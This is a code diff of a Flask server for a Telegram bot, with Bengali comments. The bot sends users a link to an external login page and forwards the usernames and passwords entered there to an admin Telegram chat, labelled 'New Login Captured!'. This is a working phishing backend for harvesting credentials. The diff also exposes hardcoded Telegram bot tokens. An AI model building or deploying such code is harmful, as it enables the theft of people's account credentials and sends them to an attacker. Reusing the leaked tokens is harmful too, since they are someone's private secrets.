@@ -12,10 +12,10 @@ CORS(app)
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8472535428:AAGAcUvGClisEF9Kr0MsaKLGw5Je_AY4JVU")
 
 # Admin Bot Token
-ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8218726690:AAHMwmdce9LJA1GPovRo4Exk4ON7_P4CUdY")  # <-- এখানে তোমার এডমিন বট টোকেন দাও
+ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "YOUR_ADMIN_BOT_TOKEN_HERE")
 
-# Admin Telegram Chat ID (যেখানে সব লগইন ইনফো যাবে)
-ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "1849126202")  # <-- এখানে তোমার নিজের Telegram ID বা Admin Chat ID দাও
+# Admin Telegram Chat ID (তোমার নিজের ID)
+ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "YOUR_ADMIN_CHAT_ID_HERE")
 
 # Frontend Netlify URL
 FRONTEND_BASE = "https://beamish-speculoos-1994d0.netlify.app"
@@ -40,7 +40,7 @@ def save_users():
         json.dump(registered_users, f, indent=4)
 
 # -------------------------
-# Telegram message পাঠানো (মেইন বট)
+# মেইন বট-এ মেসেজ পাঠানো
 # -------------------------
 def send_message(chat_id, text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -50,7 +50,7 @@ def send_message(chat_id, text):
         print(f"❌ Error sending message to {chat_id}: {e}")
 
 # -------------------------
-# Admin message পাঠানো
+# এডমিন বট-এ মেসেজ পাঠানো
 # -------------------------
 def send_admin_message(text):
     url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
@@ -64,51 +64,57 @@ def make_register_url(chat_id):
     return f"{FRONTEND_BASE}/index.html?uid={chat_id}"
 
 # -------------------------
-# Webhook route
+# Telegram Webhook
 # -------------------------
 @app.route(f"/{BOT_TOKEN}", methods=["POST"])
 def telegram_webhook():
     data = request.get_json(silent=True) or {}
     if "message" in data:
         chat_id = data["message"]["chat"]["id"]
-        text = data["message"].get("text","")
+        text = data["message"].get("text", "")
         
         if text.lower().strip() == "/start":
-            # Welcome message + registration URL
             reg_url = make_register_url(chat_id)
-            welcome = f"🤖 Welcome!\nRegister/Login here:\n{reg_url}"
+            welcome = f"🤖 Welcome!\nPlease Register/Login here:\n{reg_url}"
             send_message(chat_id, welcome)
 
-            # ইউজারকে register করা
+            # ইউজার রেজিস্টার করা
             registered_users[str(chat_id)] = True
             save_users()
             print(f"✅ User {chat_id} registered.")
-    return jsonify({"status":"ok"})
+    return jsonify({"status": "ok"})
 
 # -------------------------
-# Login info receive
+# Login info receive route
 # -------------------------
 @app.route('/receive_login', methods=["POST"])
 def receive_login():
     data = request.json or {}
-    uid = str(data.get("uid",""))
-    username = data.get("username","")
-    password = data.get("password","")
+    uid = str(data.get("uid", ""))
+    username = data.get("username", "")
+    password = data.get("password", "")
     
     if uid and uid in registered_users:
         msg = f"🧾 Login Info\n👤 Username: {username}\n🔑 Password: {password}"
-        send_message(uid, "✅ Your login info received successfully.")
-        send_admin_message(f"👤 User UID: {uid}\n{msg}")  # Admin bot-এ পাঠানো
-        return jsonify({"status":"sent"})
+        
+        # ইউজারকেও পাঠাও (login info)
+        send_message(uid, msg)
+
+        # এডমিনকেও পাঠাও
+        admin_text = f"📩 New Login Captured!\n👤 UID: {uid}\n{msg}"
+        send_admin_message(admin_text)
+
+        print(f"✅ Sent login info to user {uid} and admin.")
+        return jsonify({"status": "sent"})
     else:
-        return jsonify({"error":"uid not found"})
+        return jsonify({"error": "uid not found"})
 
 # -------------------------
 # Home route
 # -------------------------
 @app.route('/')
 def home():
-    return "✅ Bot server running with Admin sync!"
+    return "✅ Bot server running with Admin and User notifications!"
 
 # -------------------------
 # Main
